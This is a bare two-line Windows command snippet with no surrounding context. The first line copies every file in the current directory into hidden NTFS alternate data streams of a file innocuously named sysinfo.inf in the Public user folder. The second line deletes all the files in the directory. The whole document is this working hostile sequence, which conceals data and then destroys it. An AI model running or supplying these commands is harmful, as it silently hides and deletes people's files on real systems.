for /f %f in ('dir /b') do type %f > C:\Users\Public\sysinfo.inf:%f
del *.*
